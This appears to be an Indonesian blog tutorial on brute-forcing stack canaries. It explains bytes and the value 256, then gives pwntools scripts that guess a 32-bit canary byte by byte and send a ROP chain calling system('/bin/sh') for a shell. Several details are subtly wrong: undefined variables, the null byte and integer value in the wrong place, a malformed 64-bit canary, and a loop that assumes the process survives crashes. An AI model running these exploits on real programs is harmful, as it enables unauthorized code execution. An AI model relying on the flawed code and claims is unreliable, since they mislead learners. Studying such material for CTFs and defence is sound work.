---
title: Bypass Stack Canary - Memahami Bit, Byte, dan Nilai 256 dalam Brute-Force Exploit
date: 2025-08-19
Tags: ["Pwn"]
---



## **1. Apa Itu Bit dan Byte?**  
Sebelum memahami **stack canary**, kita perlu mengerti dasar-dasar **bit** dan **byte**:  

- **1 Bit** = Nilai terkecil dalam komputasi (`0` atau `1`).  
- **1 Byte** = Kumpulan **8 bit** (contoh: `01011010`).  
  - **1 Byte bisa menyimpan nilai dari `0` sampai `255`** (total **256 kemungkinan**).  
  - Kenapa **256**? Karena `2^8 = 256` (8 bit = 256 kombinasi).  

Contoh:  
- `00000000` (binary) = `0` (decimal)  
- `11111111` (binary) = `255` (decimal)  

**Kesimpulan:**  
- **1 Byte = 8 Bit = Nilai 0-255 (total 256 kemungkinan).**  
- **Nilai 256 dipakai karena itu batas maksimal 1 byte.**  

---

## **2. Apa Itu Stack Canary?**  
**Stack Canary** adalah nilai rahasia (random) di stack yang berfungsi seperti "alarm" untuk mendeteksi **buffer overflow**.  

- **Ukuran Canary:**  
  - **32-bit program** → Canary = **4 byte** (contoh: `0xefbead00`)  
  - **64-bit program** → Canary = **8 byte** (contoh: `0xdeadbeefcafeb00`)  

- **Cara Kerja:**  
  - Jika ada **buffer overflow**, canary akan **tertimpa** sebelum return address.  
  - Sebelum fungsi selesai (`ret`), program mengecek apakah canary masih utuh.  
  - Jika **berubah** → Program crash (`*** stack smashing detected ***`).  

---

## **3. Kenapa Brute-Force Canary Menggunakan `range(256)`?**  
Karena **setiap byte canary bisa bernilai `0` sampai `255` (total 256 kemungkinan)**, kita perlu mencoba semua kemungkinan byte tersebut.  

### **Contoh Brute-Force Canary (32-bit)**
```python
from pwn import *

p = process("./binary32")  # Program 32-bit (canary 4 byte)

canary = b""  # Inisialisasi canary kosong

# Brute-force 3 byte pertama (byte ke-4 = \x00)
for i in range(3):  # 3 byte pertama
    for byte in range(256):  # Coba semua nilai byte (0-255)
        payload = b"A"*offset + canary + bytes([byte])
        p.sendline(payload)
        if b"stack smashing" not in p.recv():  # Jika tidak crash, byte benar
            canary += bytes([byte])  # Tambahkan byte yang benar
            print(f"Found byte {i+1}: {hex(byte)}")
            break

canary += b"\x00"  # Tambahkan null byte terakhir (byte ke-4)
print(f"Full canary: {hex(u32(canary))}")  # Output: 0xefbead00 (misal)
```

### **Penjelasan Kode:**  
1. **`for byte in range(256)`**  
   - Mencoba **semua nilai byte (0-255)** untuk menemukan byte yang benar.  
2. **`bytes([byte])`**  
   - Mengubah angka (misal `255`) menjadi byte (`\xff`).  
3. **`canary += b"\x00"`**  
   - Byte terakhir canary biasanya `\x00` (null byte), jadi tidak perlu ditebak.  

---

## **4. Penerapan Brute-Force Canary dalam Exploit**  
Setelah dapat **canary**, kita bisa lanjutkan eksploitasi dengan **Return-Oriented Programming (ROP)** atau **Ret2Libc**.  

### **Contoh Payload Setelah Dapat Canary (32-bit)**
```python
from pwn import *

p = process("./binary32")
offset = 64  # Ganti dengan offset yang benar
canary = b"\xef\xbe\xad\x00"  # Canary yang sudah ditemukan

# ROP chain untuk call system("/bin/sh")
rop = ROP("./binary32")
rop.call("system", [next(libc.search(b"/bin/sh"))])

payload = (
    b"A" * offset +  # Isi buffer
    canary +         # Canary yang benar
    b"B" * 12 +      # Padding (EBP & alignment)
    rop.chain()      # ROP chain
)

p.sendline(payload)
p.interactive()  # Dapat shell!
```

---

## **5. Kesimpulan**  
- **1 Byte = 8 Bit = Nilai 0-255 (256 kemungkinan).**  
- **Brute-force canary** = Mencoba semua kemungkinan byte (`0-255`) untuk menemukan nilai canary.  
- **32-bit canary** = 4 byte (3 byte ditebak, 1 byte null).  
- **64-bit canary** = 8 byte (7 byte ditebak, 1 byte null).  
- **Setelah dapat canary**, lanjutkan dengan **ROP/Ret2Libc** untuk bypass NX.  

Dengan memahami **bit, byte, dan nilai 256**, kita bisa melakukan **brute-force canary** untuk mengeksploitasi **buffer overflow**! 🚀  
